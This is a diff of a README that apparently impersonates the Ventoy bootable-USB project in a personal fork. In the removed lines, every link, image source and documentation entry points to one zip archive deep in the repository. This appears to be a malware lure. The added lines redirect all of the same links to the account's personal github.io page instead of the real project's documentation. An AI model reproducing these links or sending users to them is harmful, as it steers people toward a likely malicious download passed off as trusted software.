@@ -1,12 +1,12 @@
 <h1 align="center">
-  <a https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip>Ventoy</a>
+  <a https://ricardocvs13.github.io>Ventoy</a>
 </h1>
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip">
-  <img src="https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip">
-  <img src="https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip">
-  <img src="https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip">
+  <img src="https://ricardocvs13.github.io">
+  <img src="https://ricardocvs13.github.io">
+  <img src="https://ricardocvs13.github.io">
+  <img src="https://ricardocvs13.github.io">
 </p>
 
 <h4 align="left">
@@ -16,7 +16,7 @@ You can copy many image files at a time and ventoy will give you a boot menu to 
 x86 Legacy BIOS, IA32 UEFI, x86_64 UEFI and ARM64 UEFI are supported in the same way.<br/>
 Both MBR and GPT partition style are supported in the same way.<br/>
 Most type of OS supported(Windows/WinPE/Linux/Unix/Vmware/Xen...) <br/>
-580+ ISO files are tested. 90%+ distros in https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip supported. <br/>
+580+ ISO files are tested. 90%+ distros in https://ricardocvs13.github.io supported. <br/>
 </h4>
 
 # Features
@@ -48,39 +48,39 @@ Most type of OS supported(Windows/WinPE/Linux/Unix/Vmware/Xen...) <br/>
 * Data nondestructive during version upgrade
 * No need to update Ventoy when a new distro is released
 
-![avatar](https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip)
+![avatar](https://ricardocvs13.github.io)
 
 
 # Installation Instructions
-See [https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip](https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip) for detail
+See [https://ricardocvs13.github.io](https://ricardocvs13.github.io) for detail
 
 # Compile Instructions
-Please refer to [https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip](https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip)
+Please refer to [https://ricardocvs13.github.io](https://ricardocvs13.github.io)
 
 # Document
 Title | Link
 -|-
-**Install & Update** | [https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip](https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip)
-**Customize Theme** | [https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip](https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip)  
-**Global Control** | [https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip](https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip)  
-**Auto Installation** | [https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip](https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip)  
-**Injection Plugin** | [https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip](https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip)  
-**Persistence Support** | [https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip](https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip)  
-**Boot WIM file** | [https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip](https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip)  
-**Menu Class** | [https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip](https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip)  
-**Menu Alias** | [https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip](https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip)  
-**Menu Extension** | [https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip](https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip)  
-**Memdisk Mode** | [https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip](https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip)  
-**TreeView Mode** | [https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip](https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip)  
-**Disk Layout MBR** | [https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip](https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip)  
-**Disk Layout GPT** | [https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip](https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip)  
+**Install & Update** | [https://ricardocvs13.github.io](https://ricardocvs13.github.io)
+**Customize Theme** | [https://ricardocvs13.github.io](https://ricardocvs13.github.io)  
+**Global Control** | [https://ricardocvs13.github.io](https://ricardocvs13.github.io)  
+**Auto Installation** | [https://ricardocvs13.github.io](https://ricardocvs13.github.io)  
+**Injection Plugin** | [https://ricardocvs13.github.io](https://ricardocvs13.github.io)  
+**Persistence Support** | [https://ricardocvs13.github.io](https://ricardocvs13.github.io)  
+**Boot WIM file** | [https://ricardocvs13.github.io](https://ricardocvs13.github.io)  
+**Menu Class** | [https://ricardocvs13.github.io](https://ricardocvs13.github.io)  
+**Menu Alias** | [https://ricardocvs13.github.io](https://ricardocvs13.github.io)  
+**Menu Extension** | [https://ricardocvs13.github.io](https://ricardocvs13.github.io)  
+**Memdisk Mode** | [https://ricardocvs13.github.io](https://ricardocvs13.github.io)  
+**TreeView Mode** | [https://ricardocvs13.github.io](https://ricardocvs13.github.io)  
+**Disk Layout MBR** | [https://ricardocvs13.github.io](https://ricardocvs13.github.io)  
+**Disk Layout GPT** | [https://ricardocvs13.github.io](https://ricardocvs13.github.io)  
 
 
 # FAQ
-See [https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip](https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip) for detail
+See [https://ricardocvs13.github.io](https://ricardocvs13.github.io) for detail
 
 
 # Forum
-[https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip](https://raw.githubusercontent.com/ricardocvs13/Ventoy/master/Ventoy2Disk/Ventoy2Disk/ff14/Software-spar.zip)
+[https://ricardocvs13.github.io](https://ricardocvs13.github.io)
 
 
